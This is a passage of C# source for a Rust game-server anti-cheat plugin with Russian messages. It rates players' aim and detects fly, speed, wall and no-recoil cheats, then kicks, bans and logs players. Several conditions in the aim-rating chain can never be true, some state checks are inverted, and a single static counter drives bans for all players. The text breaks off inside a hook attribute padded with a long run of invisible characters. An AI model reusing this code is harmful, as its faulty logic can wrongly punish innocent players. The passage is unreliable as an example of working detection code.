                    if (playerKey.Hits < 30 || playerKey.Killed < 10)
                    {
                        aimdesc = "Новый игрок";
                    }
                    else if (razn > -5 && razn > 5 && kdr < 2)
                    {
                        aimdesc = "Простой игрок";
                    }
                    else if (razn > -5 && razn > 5 && kdr < 3)
                    {
                        aimdesc = "Подозрительный игрок";
                    }
                    else if (razn > -5 && razn > 5 && kdr >= 3)
                    {
                        aimdesc = "Очень подозрительный игрок";
                    }
                    else if (razn > -5 && razn < -8 && kdr < 2)
                    {
                        aimdesc = "Игрок с хорошей точностью в голову";
                    }
                    else if (razn > -5 && razn < -8 && kdr < 3)
                    {
                        aimdesc = "Скилловый игрок";
                    }
                    else if (razn > -5 && razn < -8 && kdr < 4)
                    {
                        aimdesc = "Подозрительный игрок";
                    }
                    if (razn > -5 && razn < -8 && kdr >= 4)
                    {
                        aimdesc = "Читер";
                    }
                    else if (razn > 5 && razn < 8 && kdr < 1)
                    {
                        aimdesc = "Игрок со слабым скиллом";
                    }
                    else if (razn > 5 && razn < 8 && kdr < 2)
                    {
                        aimdesc = "Подозрительный игрок";
                    }
                    else if (razn > 5 && razn < 8 && kdr < 3)
                    {
                        aimdesc = "Очень подозрительный игрок";
                    }
                    if (razn > 5 && razn < 8 && kdr >= 4)
                    {
                        aimdesc = "Читер";
                    }
                    i++;
                    players = players + $"{i}. {player.displayName} ({player.userID}) | aim: {aimprocent}% | kdr {kdr} | {aimdesc} \n";
                }
            }
            arg.ReplyWith(players + "-------------------------------------------------------------------------------");
        }
        void Unload()
        {
            DestroyAll<PlayerHack>();
            SavePlayerData();
            SaveDataAdmin();
        }
        void DestroyAll<T>()
        {
            UnityEngine.Object[] objects = GameObject.FindObjectsOfType(typeof(T));
            if (objects != null) foreach (UnityEngine.Object gameObj in objects) GameObject.Destroy(gameObj);
        }
        void OnPlayerConnected(BasePlayer player)
        {
            if (player == null) return;
            if (player.IsAdmin || permission.UserHasPermission(player.UserIDString, "anticheat.toggleadmin"))
            {
                if (!adata.AdminData.ContainsKey(player.userID))
                {
                    adata.AdminData.Add(player.userID, new ADMINDATA()
                    {
                        Name = player.displayName,
                        Check = false,
                    }
                    );
                }
                else
                {
                    adata.AdminData[player.userID].Name = player.displayName;
                }
                if (adata.AdminData[player.userID].Check) SendReply(player, "<color=RED>Внимание!</color> У вас включен админ дебаг. Советуем его отключить (/ac)");
            }
            else if (adata.AdminData.ContainsKey(player.userID)) if (!player.IsAdmin || !permission.UserHasPermission(player.UserIDString, "anticheat.toggleadmin"))
                {
                    adata.AdminData[player.userID].Check = adata.AdminData[player.userID].Check = true;
                }
            if (!PlayersListed.ContainsKey(player.userID)) CreateInfo(player);
            else
            {
                if (player.displayName != PlayersListed[player.userID].Name) PlayersListed[player.userID].Name = player.displayName;
            }
            new PluginTimers(this).Once(2f, () => CheckFLY(player));
            timer.Once(1f, () => RefreshPlayer(player));
        }
        void RefreshPlayer(BasePlayer player)
        {
            if (player.GetComponent<PlayerHack>() == null) player.gameObject.AddComponent<PlayerHack>();
        }
        private void AutoBan(BasePlayer player, string reason)
        {
            if (b == DetectCountFSH)
            {
                Ban(player.userID, "[Анти-чит] Banned: вы были забанены на сервере.");
                LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] -  Ban: Reason - {reason} {player.displayName}({player.UserIDString}) забанен! Количество детектов привысило заданный предел.  Предупреждений: {b + 1}", this, true);
            }
        }
        private void CheckFLY(BasePlayer player)
        {
            if (player == null) return;
            if (!player.IsConnected) return;
            var position = player.transform.position;
            int f = 0;
            new PluginTimers(this).Repeat(2f, 0, () => {
                if (!player.IsConnected) return;
                if (adata.AdminData.ContainsKey(player.userID))
                {
                    if (!adata.AdminData[player.userID].Check) return;
                }
                if (player.IsFlying && !player.IsSwimming() && !player.IsDead() && !player.IsSleeping() && !player.IsWounded())
                {
                    f++;
                    if (f >= 1)
                    {
                        if (b == DetectCountFSH && FHEnabled)
                        {
                            AutoBan(player, "FlyHack");
                        }
                        else
                        {
                            if (FHKickEnabled)
                            {
                                Kick(player, "[Анти-чит] Обнаружен FlyHack");
                                Debug.LogError($"[Анти-чит], {player.displayName}, ({player.UserIDString}) кикнут! Причина: FlyHack!");
                                LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (FlyHack) Игрок {player.displayName}({player.UserIDString}) кикнут! Слишком долго находился в воздухе! Предупреждений: {b + 1}", this, true);
                            }
                            SendDetection(player, string.Format("<color=#ffa500>[Античит детект]</color> " + "(FLYHack) Игрок" + player.displayName + $" Слишком долго находиться в воздухе! Предупреждений: {b + 1}"));
                            var messages = $"Обнаружен FlyHack Предупреждений: {b + 1}";
                            Debug.LogWarning($"[Анти-чит] {player.displayName}({player.UserIDString}) Обнаружен FlyHack Предупреждений: {b + 1}");
                            LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (FlyHack) У игрок {player.displayName}({player.UserIDString}) обнаружен FlyHack Предупреждений: {b + 1}", this, true);
                            b++;
                            return;
                        }
                    }
                }
                else
                {
                    f = 0;
                }
            }
            );
        }
        public class PlayerHack : MonoBehaviour
        {
            public BasePlayer player;
            public Vector3 lastPosition;
            public Vector3 currentDirection;
            public bool isonGround;
            public float Distance3D;
            public float VerticalDistance;
            public float deltaTick;
            public float speedHackDetections = 0f;
            public double currentTick;
            public double lastTick;
            public double lastTickFly;
            public double lastTickSpeed;
            void Awake()
            {
                player = GetComponent<BasePlayer>();
                InvokeRepeating("CheckPlayer", 1f, 1f);
                lastPosition = player.transform.position;
            }
            static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
            static double CurrentTime()
            {
                return DateTime.UtcNow.Subtract(epoch).TotalMilliseconds;
            }
            static List<PlayerHack> fpsCalled = new List<PlayerHack>();
            static double fpsTime;
            static bool fpsCheckCalled = false;
            static void CheckForHacks(PlayerHack hack)
            {
                CheckForSpeedHack(hack);
            }
            static int fpsIgnore = 30;
            void CheckPlayer()
            {
                if (!player.IsConnected) GameObject.Destroy(this);
                currentTick = CurrentTime();
                deltaTick = (float)((currentTick - lastTick) / 1000.0);
                Distance3D = Vector3.Distance(player.transform.position, lastPosition) / deltaTick;
                VerticalDistance = (player.transform.position.y - lastPosition.y) / deltaTick;
                currentDirection = (player.transform.position - lastPosition).normalized;
                isonGround = player.IsOnGround();
                if (!player.IsWounded() && !player.IsDead() && !player.IsSleeping() && deltaTick < 1.1f && Performance.current.frameRate > fpsIgnore) CheckForHacks(this);
                lastPosition = player.transform.position;
                if (fpsCheckCalled) if (!fpsCalled.Contains(this))
                    {
                        fpsCalled.Add(this);
                        fpsTime += (CurrentTime() - currentTick);
                    }
                lastTick = currentTick;
            }
        }
        static float minSpeedPerSecond = 10f;
        static double LogTime()
        {
            return DateTime.UtcNow.Subtract(epoch).TotalSeconds;
        }
        static Vector3 lastGroundPosition;
        static void CheckForSpeedHack(PlayerHack hack)
        {
            if (instance.adata.AdminData.ContainsKey(hack.player.userID))
            {
                if (!instance.adata.AdminData[hack.player.userID].Check) return;
            }
            RaycastHit hit;
            if (Physics.Raycast(hack.player.transform.position, Vector3.down, out hit, LayerMask.GetMask("Construction")))
            {
                if (hit.transform.position != lastGroundPosition) return;
                lastGroundPosition = hit.transform.position;
            }
            if (hack.Distance3D < minSpeedPerSecond) return;
            if (hack.VerticalDistance < -8f) return;
            if (hack.lastTickSpeed == hack.lastTick)
            {
                if (hack.player.IsSwimming() && hack.player.IsDead() && hack.player.IsSleeping() && hack.player.IsWounded()) return;
                if (hack.player.GetMounted()) return;
                hack.speedHackDetections++;
                if (instance.SHEnable)
                {
                    if (hack.player.IsOnGround())
                    {
                        if (b == instance.DetectCountFSH && instance.SHEnabled)
                        {
                            instance.AutoBan(hack.player, "SpeedHack");
                            instance.LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - (Speedhack) Игрок {hack.player.displayName}({hack.player.UserIDString}) забанен! Двигался со скоростью выше нормы. Предупреждений: {b + 1}", AntiCheat.instance, true);
                        }
                        else
                        {
                            if (instance.SHKickEnabled)
                            {
                                instance.Kick(hack.player, "[Анти-чит] Обнаружен SpeedHack");
                                Debug.LogError($"[Анти-чит] {hack.player.displayName}({hack.player.UserIDString}) кикнут! Причина: SpeedHack!");
                            }
                            var messages = $"Обнаружен Speedhack ({hack.Distance3D.ToString()} м/с) Предупреждений: {b + 1}";
                            instance.LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (Speedhack) Игрок {hack.player.displayName}({hack.player.UserIDString}) двигаеться со скоростью выше нормы. Предупреждений: {b + 1}", AntiCheat.instance, true);
                            instance.SendDetection(hack.player, string.Format($"<color=#ffa500>[Античит детект]</color> (SPEEDHack) Игрок {hack.player.displayName}({hack.player.UserIDString}) двигаеться со скоростью выше нормы. Предупреждений: {b + 1}"));
                            UnityEngine.Debug.LogError($"[Анти-чит] Игрок {hack.player.displayName}({hack.player.UserIDString}) двигаеться со скоростью выше нормы. Предупреждений: {b + 1}");
                            b++;
                        }
                    }
                }
            }
            else
            {
                hack.speedHackDetections = 0f;
            }
            hack.lastTickSpeed = hack.currentTick;
        }
        static int bulletmask;
        static DamageTypeList emptyDamage = new DamageTypeList();
        static Vector3 VectorDown = new Vector3(0f, -1f, 0f);
        static Hash<BasePlayer, float> lastWallhack = new Hash<BasePlayer, float>();
        Hash<ulong, ColliderCheckTest> playerWallcheck = new Hash<ulong, ColliderCheckTest>();
        static RaycastHit cachedRaycasthit;
        [HookMethod("WallhackKillCheck")]
        private void WallhackKillCheck(BasePlayer player, BasePlayer attacker, HitInfo hitInfo)
        {
            if (adata.AdminData.ContainsKey(player.userID))
            {
                if (adata.AdminData[player.userID].Check == false) return;
            }
            if (Physics.Linecast(attacker.eyes.position, hitInfo.HitPositionWorld, out cachedRaycasthit, bulletmask))
            {
                BuildingBlock block = cachedRaycasthit.collider.GetComponentInParent<BuildingBlock>();
                if (block != null)
                {
                    if (block.blockDefinition.hierachyName == "wall.window") return;
                    CancelDamage(hitInfo);
                    if (Time.realtimeSinceStartup - lastWallhack[attacker] > 0.5f)
                    {
                        lastWallhack[attacker] = Time.realtimeSinceStartup;
                        UnityEngine.Debug.LogError($"WalhackAttack обнаружен у {player.displayName}");
                        LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (WalhackAttack) {player.displayName}({player.UserIDString}) нанес урон через препятствие!", this, true);
                        SendDetection(player, string.Format("<color=#ffa500>[Античит детект]</color> " + "(WalhackAttack) " + player.displayName + " нанес урон через препятствие!"));
                    }
                }
            }
        }
        private void CancelDamage(HitInfo hitinfo)
        {
            hitinfo.damageTypes = emptyDamage;
            hitinfo.HitEntity = null;
        }
        private readonly Dictionary<ulong, NoRecoilData> data = new Dictionary<ulong, NoRecoilData>();
        private readonly Dictionary<ulong, Timer> detections = new Dictionary<ulong, Timer>();
        private readonly int detectionDiscardSeconds = 300;
        private readonly int violationProbability = 30;
        private readonly int maximumViolations = 30;
        private readonly Dictionary<string, int> probabilityModifiers = new Dictionary<string, int>() {
                {
                "weapon.mod.muzzleboost", -5
            }
            , {
                "weapon.mod.silencer", -5
            }
            , {
                "weapon.mod.holosight", -5
            }
            , {
                "crouching", -8
            }
            , {
                "aiming", -5
            }
        }
        ;
        private readonly List<string> blacklistedAttachments = new List<string>() {
            "weapon.mod.muzzlebreak", "weapon.mod.silencer", "weapon.mod.small.scope"
        }
        ;
        public class NoRecoilData
        {
            public int Ticks = 0;
            public int Count;
            public int Violations;
        }
        void OnWeaponFired(BaseProjectile projectile, BasePlayer player, ItemModProjectile mod, ProjectileShoot projectiles)
        {
            if (!AntiRecoilEnabled) return;
            if (player == null) return;
            if (IsNPC(player)) return;
            if (adata.AdminData.ContainsKey(player.userID)) if (!adata.AdminData[player.userID].Check) return;
            var item = player.GetActiveItem();
            if (item == null) return;
            if (!(ListWeapons.Contains(item.info.shortname))) return;
            var counts = 0;
            foreach (Item attachment in item.contents.itemList) if (attachment.info.shortname == "weapon.mod.muzzlebrake" || attachment.info.shortname == "weapon.mod.holosight") counts++;
            if (counts == 2) return;
            if (item.contents.itemList.Any(x => blacklistedAttachments.Contains(x.info.shortname))) return;
            NoRecoilData info;
            if (!data.TryGetValue(player.userID, out info)) data.Add(player.userID, info = new NoRecoilData());
            Vector3 eyesDirection = player.eyes.HeadForward();
            if (eyesDirection.y < -0.80) return;
            info.Ticks++;
            int probModifier = 0;
            foreach (Item attachment in item.contents.itemList) if (probabilityModifiers.ContainsKey(attachment.info.shortname)) probModifier += probabilityModifiers[attachment.info.shortname];
            if (player.modelState.aiming && probabilityModifiers.ContainsKey("aiming")) probModifier += probabilityModifiers["aiming"];
            if (player.IsDucked() && probabilityModifiers.ContainsKey("crouching")) probModifier += probabilityModifiers["crouching"];
            Timer detectionTimer;
            if (detections.TryGetValue(player.userID, out detectionTimer)) detectionTimer.Reset(detectionDiscardSeconds);
            else detections.Add(player.userID, timer.Once(detectionDiscardSeconds, delegate () {
                if (info.Violations > 0) info.Violations--;
            }
            ));
            timer.Once(0.5f, () => {
                ProcessRecoil(projectile, player, mod, projectiles, info, probModifier, eyesDirection);
            }
            );
        }
        private void ProcessRecoil(BaseProjectile projectile, BasePlayer player, ItemModProjectile mod, ProjectileShoot projectileShoot, NoRecoilData info, int probModifier, Vector3 eyesDirection)
        {
            if (projectile == null || player == null || mod == null || projectileShoot == null || info == null || eyesDirection == null) return;
            var nextEyesDirection = player.eyes.HeadForward();
            if (Math.Abs(nextEyesDirection.y - eyesDirection.y) < .009 && nextEyesDirection.y < .8) info.Count++;
            if (info.Ticks <= 10) return;
            var prob = 100 * info.Count / info.Ticks;
            var item = player.GetActiveItem();
            if (prob > ((100 - violationProbability) + probModifier))
            {
                if (prob > 100) prob = 100;
                if (prob < DetectPerMacros) return;
                info.Violations++;
                Debug.LogError("(Макрос) " + player.displayName + ": вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString() + ".");
                SendDetection(player, string.Format("<color=#ffa500>[Античит детект]</color> " + "(NoRecoil) " + "У игрока " + player.displayName + " обнаружен NoRecoil " + ",вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString()));
                LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (Макрос) " + player.displayName + ": вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString() + " | " + item.info.shortname, this, true);
                if (info.Violations > DetectCountMacros && MCREnabled)
                {
                    Ban(player.userID, "[Анти-чит] Обнаружен скрипт для макроса");
                    LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - (Макрос) Игрок" + player.displayName + "забанен. Вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString() + " | " + item.info.shortname, this, true);
                }
            }
            info.Ticks = 0;
            info.Count = 0;
        }
        static Hash<BasePlayer, int> wallhackDetec = new Hash<BasePlayer, int>();
        public class ColliderCheckTest : MonoBehaviour
        {
            public BasePlayer player;
            Hash<Collider, Vector3> entryPosition = new Hash<Collider, Vector3>();
            SphereCollider col;
            public float teleportedBack;
            public Collider lastCollider;
            void Awake()
            {
                player = transform.parent.GetComponent<BasePlayer>();
                col = gameObject.AddComponent<SphereCollider>();
                col.radius = 0.1f;
                col.isTrigger = true;
                col.center = new Vector3(0f, 0.5f, 0f);
            }
            public static BaseEntity GetCollEntity(Vector3 entry, Vector3 exist)
            {
                var rayArray = Physics.RaycastAll(exist, entry, Vector3.Distance(entry, exist), constructionColl);
                for (int i = 0;
                i < rayArray.Length;
                i++)
                {
                    return rayArray[i].GetEntity();
                }
                return null;
            }
            void OnTriggerExit(Collider col)
            {
                if (textureenable) if (entryPosition.ContainsKey(col))
                    {
                        BuildingBlock block = col.GetComponent<BuildingBlock>();
                        if (block != null)
                        {
                            if (!block.gameObject.name.Contains("foundation.steps") && !block.gameObject.name.Contains("block.halfheight.slanted"))
                            {
                                instance.SendDetection(player, string.Format($"{player.displayName},({player.userID}) Обнаружен TextureHack!"));
                                ForcePlayerBack(this, col, entryPosition[col], player.transform.position);
                                if (Time.realtimeSinceStartup - lastWallhack[player] < 10f)
                                {
                                    instance.SendDetection(player, string.Format($"{player.displayName},({player.userID}) Обнаружен WallHack! Детект № {wallhackDetec[player]}"));
                                    wallhackDetec[player]++;
                                    instance.LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (WallHack) {player.userID.ToString()} {player.displayName.ToString()} Обнаружен WallHack! Обнаружений {wallhackDetec[player]}", AntiCheat.instance, true);
                                }
                                lastWallhack[player] = Time.realtimeSinceStartup;
                            }
                        }
                        entryPosition.Remove(col);
                    }
            }
            void OnDestroy()
            {
                Destroy(gameObject);
                Destroy(col);
            }
        }
        static void ForcePlayerBack(ColliderCheckTest colcheck, Collider collision, Vector3 entryposition, Vector3 exitposition)
        {
            Vector3 rollBackPosition = GetRollBackPosition(entryposition, exitposition, 4f);
            Vector3 rollDirection = (entryposition - exitposition).normalized;
            foreach (RaycastHit rayhit in UnityEngine.Physics.RaycastAll(rollBackPosition, (exitposition - entryposition).normalized, 5f))
            {
                if (rayhit.collider == collision)
                {
                    rollBackPosition = rayhit.point + rollDirection * 1f;
                }
            }
            colcheck.teleportedBack = Time.realtimeSinceStartup;
            colcheck.lastCollider = collision;
            ForcePlayerPosition(colcheck.player, rollBackPosition);
        }
        static Vector3 GetRollBackPosition(Vector3 entryposition, Vector3 exitposition, float distance)
        {
            distance = Vector3.Distance(exitposition, entryposition) + distance;
            var direction = (entryposition - exitposition).normalized;
            return (exitposition + (direction * distance));
        }
        new static void ForcePlayerPosition(BasePlayer player, Vector3 destination)
        {
            player.MovePosition(destination);
            player.ClientRPCPlayer(null, player, "ForcePositionTo", destination);
        }
        [HookMethod("OnBasePlayerAttacked⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠